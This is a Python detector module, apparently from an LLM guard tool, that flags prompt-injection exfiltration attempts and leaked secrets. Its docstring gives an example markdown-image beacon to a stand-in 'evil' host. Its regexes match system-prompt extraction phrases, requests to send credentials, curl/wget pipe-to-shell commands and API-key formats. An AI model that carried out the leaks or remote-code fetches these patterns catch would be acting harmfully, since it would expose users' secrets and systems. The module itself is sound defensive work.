"""Data-exfiltration and secret-leak detection (both directions).

Two complementary jobs:

- **Input side:** spot *instructions* to exfiltrate — "print your system prompt",
  markdown-image beacons (`![x](https://evil/?d=<secret>)`), "send the API key
  to …", pipe-to-shell. These try to turn the model into a leak channel.
- **Output side:** spot *actual secrets* about to leave — API keys, private
  keys, AWS creds — and system-prompt regurgitation.

Output-side secret detection is what makes ShadowShield a true two-way shield:
even a model that was successfully jailbroken is stopped at the exit.
"""

from __future__ import annotations

import re

from ..core.types import Direction, Severity, Threat, ThreatCategory
from .base import Detector, ScanContext, locate_span, register_detector

# Instructions that try to make the model leak (input-side).
_EXFIL_INSTRUCTIONS: tuple[tuple[str, Severity, float, str], ...] = (
    (
        r"\b(?:print|reveal|show|repeat|output|display|tell me)\b[\w\s]{0,25}?"
        r"\b(?:your |the )?(?:system )?(?:prompt|instructions?|directive|configuration|rules)\b",
        Severity.HIGH,
        0.8,
        "System-prompt extraction attempt.",
    ),
    (
        r"\b(?:repeat|echo|say|print|output|reproduce)\b[^\n]{0,20}?"
        r"\b(?:everything|all|the text|the words|words above|the above|the prompt|"
        r"the system)\b",
        Severity.MEDIUM,
        0.6,
        "Attempt to make the model echo its preceding context.",
    ),
    (
        # ``[^\n]`` gap (not ``[\w\s]``) so apostrophes/possessives like
        # "the user's password" don't break the match.
        r"\b(?:send|post|upload|exfiltrate|forward|transmit|leak|encode|smuggle)\b[^\n]{0,30}?"
        r"\b(?:api[\s_-]?key|secret|token|password|credential|private key|env|"
        r"environment|cookie|session)\b",
        Severity.HIGH,
        0.82,
        "Instruction to transmit/exfiltrate secrets or credentials.",
    ),
    (
        r"\b(?:curl|wget|Invoke-WebRequest|fetch)\b[^\n|]{0,80}\|\s*(?:bash|sh|powershell|python)\b",
        Severity.HIGH,
        0.8,
        "Pipe-to-shell instruction in content.",
    ),
)

# Actual secret material (output-side, but also flagged in input).
_SECRET_PATTERNS: tuple[tuple[str, Severity, float, str], ...] = (
    (
        r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----",
        Severity.CRITICAL,
        0.97,
        "Private key block.",
    ),
    (r"\bsk-[A-Za-z0-9]{20,}\b", Severity.HIGH, 0.85, "OpenAI-style secret API key."),
    (r"\bsk-ant-[A-Za-z0-9_\-]{20,}\b", Severity.HIGH, 0.88, "Anthropic API key."),
    (r"\bAKIA[0-9A-Z]{16}\b", Severity.HIGH, 0.85, "AWS access key id."),
    (r"\bghp_[A-Za-z0-9]{36}\b", Severity.HIGH, 0.85, "GitHub personal access token."),
    (r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b", Severity.HIGH, 0.82, "Slack token."),
    (r"\bAIza[0-9A-Za-z_\-]{35}\b", Severity.HIGH, 0.82, "Google API key."),
    (
        r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b",
        Severity.MEDIUM,
        0.6,
        "JWT token.",
    ),
)

_EXFIL_COMPILED = tuple(
    (re.compile(p, re.IGNORECASE), s, sc, m) for p, s, sc, m in _EXFIL_INSTRUCTIONS
)
_SECRET_COMPILED = tuple((re.compile(p), s, sc, m) for p, s, sc, m in _SECRET_PATTERNS)


def _find_markdown_beacon(text: str) -> tuple[int, int, bool] | None:
    """Find a markdown-image URL with a query assignment in one linear pass.

    The previous regex was either quadratic on unterminated openers or, once
    bounded, silently missed valid long beacons. This parser keeps work linear
    while treating overlong fields as suspicious instead of exempting them.
    Returns ``(start, end, oversized_carrier)``.
    """
    opener: int | None = None
    i = 0
    size = len(text)
    while i < size:
        if text[i] in "\r\n":
            opener = None
            i += 1
            continue
        if opener is None and text.startswith("![", i):
            opener = i
            i += 2
            continue
        if opener is None or not text.startswith("](", i):
            i += 1
            continue

        alt_length = i - opener - 2
        cursor = i + 2
        whitespace = 0
        while cursor < size and text[cursor] in " \t":
            whitespace += 1
            cursor += 1
        scheme_start = cursor
        lower_prefix = text[scheme_start : scheme_start + 8].lower()
        if not (lower_prefix.startswith("http://") or lower_prefix.startswith("https://")):
            opener = None
            i += 2
            continue

        query_marker: int | None = None
        cursor = scheme_start
        while cursor < size and text[cursor] not in ")\r\n":
            char = text[cursor]
            if char in "?&":
                query_marker = cursor
            elif char == "=" and query_marker is not None:
                prefix_length = query_marker - scheme_start
                key_length = cursor - query_marker - 1
                end = cursor + 1
                while end < size and text[end] not in ")\r\n":
                    end += 1
                if end < size and text[end] == ")":
                    end += 1
                oversized = (
                    alt_length > 256 or whitespace > 8 or prefix_length > 2_048 or key_length > 512
                )
                return opener, end, oversized
            cursor += 1

        opener = None
        i = max(i + 2, cursor)
    return None


@register_detector
class ExfiltrationDetector(Detector):
    """Detects exfiltration instructions (input) and secret leaks (both ways)."""

    name = "data_exfiltration"

    def scan(self, text: str, *, context: ScanContext) -> list[Threat]:
        threats: list[Threat] = []
        body = context.normalized.normalized

        # Instruction patterns are an input-side concern.
        if context.direction is Direction.INPUT:
            beacon = _find_markdown_beacon(body)
            if beacon is not None:
                start, end, oversized = beacon
                matched = body[start:end]
                threats.append(
                    Threat(
                        category=ThreatCategory.DATA_EXFILTRATION,
                        severity=Severity.HIGH,
                        score=0.82 if oversized else 0.78,
                        detector=self.name,
                        message=(
                            "Oversized markdown-image beacon carrier "
                            "(possible exfiltration channel)."
                            if oversized
                            else "Markdown-image beacon with a query parameter "
                            "(exfiltration channel)."
                        ),
                        matched=matched[:160],
                        span=locate_span(text, matched, (start, end)),
                        metadata={"oversized_carrier": oversized},
                    )
                )
            for pattern, severity, score, message in _EXFIL_COMPILED:
                m = pattern.search(body)
                if m:
                    threats.append(
                        Threat(
                            category=ThreatCategory.DATA_EXFILTRATION,
                            severity=severity,
                            score=score,
                            detector=self.name,
                            message=message,
                            matched=m.group(0)[:160],
                            span=locate_span(text, m.group(0), m.span()),
                        )
                    )

        # Secret material matters in BOTH directions: in input it may be a
        # planted lure; in output it's an active leak being stopped at the exit.
        for pattern, severity, score, message in _SECRET_COMPILED:
            # Match against the raw text — secrets must not be normalised away.
            m = pattern.search(text)
            if m:
                leak_severity = severity
                if context.direction is Direction.OUTPUT:
                    leak_severity = Severity(min(Severity.CRITICAL, severity + 1))
                threats.append(
                    Threat(
                        category=ThreatCategory.SECRET_LEAK,
                        severity=leak_severity,
                        score=score,
                        detector=self.name,
                        message=(
                            f"{message} ({'leaving in model output' if context.direction is Direction.OUTPUT else 'present in input'})"
                        ),
                        # Never echo the secret itself into a Threat/audit record.
                        matched=None,
                        span=m.span(),
                        metadata={"secret_kind": message},
                    )
                )

        return threats
